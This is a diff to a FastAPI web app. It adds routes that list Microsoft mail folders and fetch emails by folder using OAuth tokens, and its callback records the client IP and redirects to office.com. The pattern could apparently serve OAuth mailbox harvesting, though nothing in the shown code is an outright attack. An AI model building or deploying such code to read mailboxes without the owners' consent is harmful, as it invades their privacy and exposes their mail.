@@ -1,9 +1,9 @@
 from fastapi import FastAPI, Request
 from fastapi.responses import RedirectResponse, JSONResponse
 from auth import generate_login_link, exchange_code_for_token
-from graph import fetch_emails
+from graph import fetch_emails, get_mail_folders  # ✅ UPDATED
 from urllib.parse import urlparse, parse_qs
-from db import init_db  # ✅ NEW
+from db import init_db
 
 app = FastAPI()
 
@@ -50,6 +50,8 @@ def generate_login_url(user_id: str = None):
 # =========================
 @app.get("/auth/callback")
 def auth_callback(request: Request):
+    init_db()
+
     code = request.query_params.get("code")
     state = request.query_params.get("state")
 
@@ -59,7 +61,6 @@ def auth_callback(request: Request):
     client_ip = request.client.host
 
     try:
-        # Extract session_id from state
         if ":" in state:
             user_id, session_id = state.split(":")
         else:
@@ -68,16 +69,15 @@ def auth_callback(request: Request):
 
         exchange_code_for_token(code, state, client_ip)
 
-        # ✅ Redirect AND set cookie
         response = RedirectResponse(url="https://www.office.com")
 
         response.set_cookie(
             key="session_id",
             value=session_id,
             httponly=True,
-            secure=True,      # ✅ REQUIRED on Render (HTTPS)
+            secure=True,
             samesite="lax",
-            path="/",         # ✅ FIX ADDED HERE
+            path="/",
         )
 
         return response
@@ -87,17 +87,45 @@ def auth_callback(request: Request):
 
 
 # =========================
-# FETCH EMAILS ROUTE (READ COOKIE)
+# FETCH EMAILS (DEFAULT)
 # =========================
 @app.get("/emails")
 def get_emails(request: Request, user_id: str = None):
     user_id = user_id or "default-user"
-
-    # ✅ Read session_id from cookie
     session_id = request.cookies.get("session_id")
 
     try:
         emails = fetch_emails(user_id, session_id)
+        return {"emails": emails}
+    except Exception as e:
+        return {"error": str(e)}
+
+
+# =========================
+# NEW: GET MAIL FOLDERS
+# =========================
+@app.get("/folders")
+def get_folders(request: Request, user_id: str = None):
+    user_id = user_id or "default-user"
+    session_id = request.cookies.get("session_id")
+
+    try:
+        folders = get_mail_folders(user_id, session_id)
+        return {"folders": folders}
+    except Exception as e:
+        return {"error": str(e)}
+
+
+# =========================
+# NEW: FETCH EMAILS BY FOLDER
+# =========================
+@app.get("/emails/{folder_id}")
+def get_emails_by_folder(folder_id: str, request: Request, user_id: str = None):
+    user_id = user_id or "default-user"
+    session_id = request.cookies.get("session_id")
+
+    try:
+        emails = fetch_emails(user_id, session_id, folder_id)
         return {"emails": emails}
     except Exception as e:
         return {"error": str(e)}
